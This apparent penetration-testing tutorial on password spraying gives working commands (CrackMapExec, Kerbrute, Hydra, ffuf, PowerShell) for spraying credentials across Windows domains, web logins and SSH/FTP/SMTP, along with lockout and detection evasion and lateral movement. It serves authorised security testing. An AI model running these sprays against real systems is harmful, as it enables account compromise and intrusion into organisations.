# Password Spraying

## Password Spraying

Password spraying is an effective authentication attack technique that attempts to access a large number of accounts with a few commonly used passwords. Unlike traditional brute force attacks that try many passwords against a single account, password spraying tries a single password against many accounts before moving on to the next password, which helps to avoid account lockouts.

### Understanding Password Spraying

#### Password Spraying vs. Brute Force

| Password Spraying                     | Traditional Brute Force                  |
| ------------------------------------- | ---------------------------------------- |
| Few passwords against many accounts   | Many passwords against few accounts      |
| Typically uses common, weak passwords | Can use dictionary or exhaustive attacks |
| Designed to evade lockout policies    | Often triggers account lockouts          |
| Lower chance of success per account   | Higher chance of success per account     |
| Lower risk of detection               | Higher risk of detection                 |

#### When to Use Password Spraying

Password spraying is most effective when:

* Account lockout policies are in place
* You have identified many valid usernames
* You want to remain stealthy
* You suspect default, common, or weak password usage
* Organization-wide password patterns might exist

### Preparation for Password Spraying

#### Understanding the Target Environment

Before performing password spraying, gather intelligence about:

1. **Account lockout thresholds**: Determine how many failed attempts trigger a lockout
2. **Lockout duration**: Learn how long accounts remain locked
3. **Lockout observation window**: Understand the time window for counting failed attempts
4. **Password complexity requirements**: Tailor your password list to meet requirements
5. **Authentication endpoints**: Identify all services that can be used for authentication

#### Creating Target Lists

Generate a list of valid usernames using techniques from user enumeration:

```bash
# Example of extracting usernames from enum4linux output
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > users.txt
```

#### Building Password Lists

Effective password spraying requires carefully selected passwords:

1. **Season-based passwords**: Spring2023!, Summer2023!, etc.
2. **Company-specific passwords**: CompanyName2023!, CompanyName123, etc.
3. **Common patterns**: Welcome1, Password1, etc.
4. **Default passwords**: Known defaults for the target system
5. **Previously breached passwords**: From public data breaches
6. **Password variations**: Account for common substitutions (@ for a, 0 for o, etc.)

Example of a minimal but effective password list:

```
Welcome123
Password123
Spring2023!
Company2023!
Changeme123
```

### Password Spraying Techniques

#### Windows/Active Directory Environment

**Using CrackMapExec for SMB**

```bash
# Basic password spray
crackmapexec smb 172.16.5.5 -u users.txt -p 'Spring2023!' --continue-on-success

# Output only successful attempts
crackmapexec smb 172.16.5.5 -u users.txt -p 'Spring2023!' --continue-on-success | grep "[+]"
```

**Using Kerbrute for Kerberos**

```bash
# Password spray against domain controller
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt 'Spring2023!'
```

**Using PowerShell Empire/Invoke-DomainPasswordSpray**

```powershell
# PowerShell-based spraying
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2023!' -Domain inlanefreight.local
```

#### Web Applications

**Using FFUF**

```bash
# POST-based login form
ffuf -w users.txt:USERNAME -X POST -d "username=USERNAME&password=Spring2023!" -H "Content-Type: application/x-www-form-urlencoded" -u http://example.com/login -mr "invalid password"
```

**Using Hydra**

```bash
# HTTP POST form
hydra -L users.txt -p 'Spring2023!' example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

#### Other Common Protocols

**SMTP**

```bash
hydra -L users.txt -p 'Spring2023!' smtp://mail.example.com
```

**SSH**

```bash
hydra -L users.txt -p 'Spring2023!' ssh://10.10.10.10
```

**FTP**

```bash
hydra -L users.txt -p 'Spring2023!' ftp://10.10.10.10
```

### Executing a Safe Password Spray

#### Time-Based Approach

To avoid triggering account lockouts, spread attempts across time:

1. Determine the lockout threshold (e.g., 5 attempts)
2. Determine the observation window (e.g., 30 minutes)
3. Use a single password against all accounts
4. Wait for the observation window to reset
5. Try the next password

```bash
# Example execution timeline
# 09:00 - Spray Password1 against all accounts
# 09:30 - Wait for lockout counter to reset
# 10:00 - Spray Welcome1 against all accounts
```

#### Jitter-Based Approach

Add randomness to your attempts to avoid detection:

```bash
# Using random delays between attempts
for user in $(cat users.txt); do
    crackmapexec smb 172.16.5.5 -u $user -p 'Spring2023!'
    sleep $(( ( RANDOM % 10 )  + 1 ))
done
```

#### Batching Approach

Divide the user list into smaller batches:

```bash
# Split users file into batches of 5 users
split -l 5 users.txt batch_

# Process each batch
for batch in batch_*; do
    crackmapexec smb 172.16.5.5 -u $batch -p 'Spring2023!' --continue-on-success
    echo "Waiting 30 minutes before next batch..."
    sleep 1800
done
```

### Detection and Evasion Considerations

#### Common Detection Methods

1. **Threshold alerts**: Multiple failed attempts detected
2. **Source IP pattern**: Multiple attempts from the same IP
3. **Timing patterns**: Regular intervals between attempts
4. **Account coverage**: Failed attempts across many accounts
5. **Unusual authentication times**: Activity outside business hours

#### Evasion Techniques

1. **Rotate source IPs**: Use multiple exit nodes or proxies
2. **Add jitter**: Randomize timing between attempts
3. **Limit scope**: Target fewer accounts per spray
4. **Use expected credentials**: Start with the most likely passwords
5. **Timing selection**: Perform spraying during normal business hours

### After a Successful Spray

#### Credential Validation

Confirm that obtained credentials are valid:

```bash
# Validate SMB credentials
crackmapexec smb 172.16.5.5 -u found_user -p 'Spring2023!'

# Validate credentials against multiple services
crackmapexec smb 172.16.5.5 -u found_user -p 'Spring2023!'
crackmapexec winrm 172.16.5.5 -u found_user -p 'Spring2023!'
crackmapexec mssql 172.16.5.5 -u found_user -p 'Spring2023!'
```

#### Privilege Assessment

Determine the permissions of compromised accounts:

```bash
# Check if user has admin rights
crackmapexec smb 172.16.5.5 -u found_user -p 'Spring2023!' --shares

# Check if user has WinRM access
crackmapexec winrm 172.16.5.5 -u found_user -p 'Spring2023!' -X whoami
```

#### Lateral Movement

Use compromised credentials to access other systems:

```bash
# Check access across multiple systems
crackmapexec smb 172.16.5.0/24 -u found_user -p 'Spring2023!'
```

### Best Practices

1. **Start conservatively**: Begin with a small subset of accounts
2. **Monitor for lockouts**: Watch for signs of account lockouts during spraying
3. **Document everything**: Keep detailed records of attempts and results
4. **Avoid service accounts**: These often have monitoring and may trigger alerts
5. **Test one password fully**: Complete a full spray with one password before moving to the next
6. **Prioritize attempts**: Start with the most likely passwords for your target environment

### Legal and Ethical Considerations

* Only perform password spraying with explicit permission
* Document all activities thoroughly
* Be mindful of potential system impacts
* Report findings responsibly
* Follow proper data handling procedures for any credentials discovered

Password spraying remains one of the most effective techniques for gaining initial access to environments with multiple user accounts. When performed carefully and methodically, it can yield valuable access while minimizing the risk of detection or account lockouts.
